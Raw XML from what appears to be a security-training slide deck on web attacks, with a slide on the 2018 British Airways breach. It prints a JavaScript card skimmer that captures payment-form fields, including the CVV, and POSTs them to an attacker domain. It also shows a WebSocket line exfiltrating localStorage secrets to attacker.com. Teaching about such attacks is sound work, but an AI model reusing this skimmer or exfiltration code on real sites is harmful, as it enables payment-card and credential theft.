            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7552134" y="2416850"/>
            <a:ext cx="6409730" cy="1754743"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1675"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7748111" y="2563773"/>
            <a:ext cx="6017776" cy="1460897"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Attacker's malicious WebSocket server</a:t>
            </a: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 Sends malicious commands to victim's browser</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2300"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ws.send("fetch('https://attacker.com/steal?data=' + localStorage.getItem('secrets'))");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40792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="659249" y="311825"/>
            <a:ext cx="4223623" cy="354330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5. Real-World Attack Examples</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="659249" y="688777"/>
            <a:ext cx="4064198" cy="283488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5.1 British Airways Data Breach (2018)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="659249" y="994886"/>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Attack Overview</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="659249" y="1292543"/>
            <a:ext cx="7825502" cy="544388"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Target:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> British Airways website</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Date:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> August-September 2018</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Impact:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> 380,000 payment cards compromised</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Method:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Malicious JavaScript injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="659249" y="1921941"/>
            <a:ext cx="2163008" cy="212646"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>How the Attack Happened</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="659249" y="2157209"/>
            <a:ext cx="1763435" cy="177165"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 1: Initial Compromise</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="659249" y="2419384"/>
            <a:ext cx="7825502" cy="1122640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4243"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="653653" y="2419384"/>
            <a:ext cx="7836694" cy="1122640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1515"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="767001" y="2504395"/>
            <a:ext cx="7609999" cy="952619"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Attackers compromised BA's third-party JavaScript library</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Original legitimate code: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&lt;script src="https://www.britishairways.com/js/modernizr-2.6.2.js"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Attackers modified the file to include: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&lt;script src="https://www.britishairways.com/js/modernizr-2.6.2.js"&gt;&lt;/script&gt;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&lt;!-- File now contained malicious code --&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="659249" y="3627035"/>
            <a:ext cx="2166699" cy="177165"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 2: Malicious Code Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="659249" y="3889211"/>
            <a:ext cx="7825502" cy="3980498"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1197"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="653653" y="3889211"/>
            <a:ext cx="7836694" cy="3980498"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 427"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="767001" y="3974221"/>
            <a:ext cx="7609999" cy="3810476"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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The compromised JavaScript file contained:</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(function()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Wait for payment form to load</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document.addEventListener('DOMContentLoaded', function()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Find payment form</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let paymentForm = document.querySelector('form[name="payment"]');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if (paymentForm)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Intercept form submission</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paymentForm.addEventListener('submit', function(e)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Steal credit card data</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let cardData =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cardNumber: document.querySelector('input[name="cardNumber"]').value,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cvv: document.querySelector('input[name="cvv"]').value,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expiry: document.querySelector('input[name="expiry"]').value,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name: document.querySelector('input[name="cardName"]').value</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 Send to attacker's server</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fetch('https://baways.com/data',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method: 'POST',</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body: JSON.stringify(cardData)</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52586B"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a: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2063</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>365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Mona Sans Semi Bold</vt:lpstr>
      <vt:lpstr>Mona Sans Light</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Funnel Sans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2026-02-03T04:45:41Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-03T08:07:03Z</dcterms:modified>
</cp:coreProperties>
</file>